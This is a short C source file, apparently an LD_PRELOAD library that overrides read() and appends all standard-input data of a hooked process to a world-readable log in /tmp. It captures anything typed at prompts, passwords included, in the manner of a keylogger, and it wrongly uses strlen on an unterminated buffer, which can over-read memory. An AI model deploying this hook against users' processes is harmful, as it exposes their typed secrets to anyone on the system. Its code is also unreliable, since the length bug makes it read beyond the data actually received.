#include <stddef.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>

#define HOOK_FILE "/tmp/stdin_hook.log"

static ssize_t (*original_read)(int fd, void * buf, size_t count) = NULL;

ssize_t read(int fd, void * buf, size_t count)
{
	if (original_read == NULL) original_read = dlsym(RTLD_NEXT, "read");
	
	const ssize_t ret = original_read(fd, buf, count);
	if (fd == 0 //&& isatty(0)
		   ) {
		const int hook_fd = open(HOOK_FILE, O_WRONLY | O_APPEND | O_CREAT, 0644);
		if (hook_fd != -1) {
			write(hook_fd, buf, strlen(buf));
			close(hook_fd);
		}
	}
	return ret;
}
